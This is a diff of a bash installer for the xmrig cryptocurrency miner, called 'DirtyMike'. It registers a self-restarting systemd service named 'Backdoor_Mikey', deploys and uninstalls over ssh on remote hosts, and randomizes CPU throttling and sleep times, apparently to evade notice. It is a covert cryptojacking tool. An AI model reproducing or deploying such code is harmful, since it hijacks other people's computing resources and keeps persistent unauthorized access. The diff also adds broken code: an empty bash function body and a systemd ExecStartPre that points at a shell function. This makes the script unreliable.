@@ -22,7 +22,7 @@ echo '
 #     53333: 2G diff (ETH port/SSL/TLS)
 poolPort=17777
 # your wallet public address
-wallet=4256HG8uJUTPBqZiJYPNQ92x6PV1sUsngAsv3TQX4woqJGFsKQkjCdoZKbgfr8C3VnLWK7Qd5Y3WJBPcuzMW93AmVSYtN2W
+wallet=YOUR_WALLET_ADDRESS
 # installation directory (DONT change)
 DIR=$HOME/c3pool
 # remote build via IP
@@ -72,7 +72,7 @@ function shuffle () {
     lim=`echo $(shuf -i$CPU_min_lim-$CPU_max_lim -n1)`;
     threads=`echo $(grep -c ^processor /proc/cpuinfo)`;
     echo "[CPU threads]:" $threads
-    echo "[CPU limiter]: limiting CPU usage to $lim% ...";
+    echo "[CPU limit shuffle]: limiting CPU usage to $lim% ...";
     echo upper limit $(($threads*$lim));
     cpulimit -e xmrig -l $(($threads*$lim)) & # 2 t/c
     sleep $(shuf -i15-45 -n1);
@@ -109,8 +109,8 @@ function install () {
     fi   
 }
 function uninstall () {
-    echo uninstalling DirtyMike ...
-    echo uninstall on remote host? (y/n); read input
+    echo 'uninstalling DirtyMike ...'
+    echo 'uninstall on remote host? (y/n)'; read input
     if [[ "$input" == "y" ]]; then
         echo "Hostname: ";read IP;echo "Login: ";read USER
         ssh $USER@$IP "rm -r $DIR"
@@ -128,6 +128,7 @@ function daemon () {
   [Unit]
 Description=Dirty Mike
 [Service]
+ExecStartPre=shuffle
 ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
 Restart=always
 Nice=8
@@ -141,15 +142,18 @@ EOL
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
 }
+function daemon2 () {
+
+}
 function build () {
     killAll       
     wait
     install && removeService && killAll
     wait
-    shuffle &
     if [[ $daemon_active == true ]]; then
         daemon
     else
+        shuffle &
         runMiner
     fi
 }
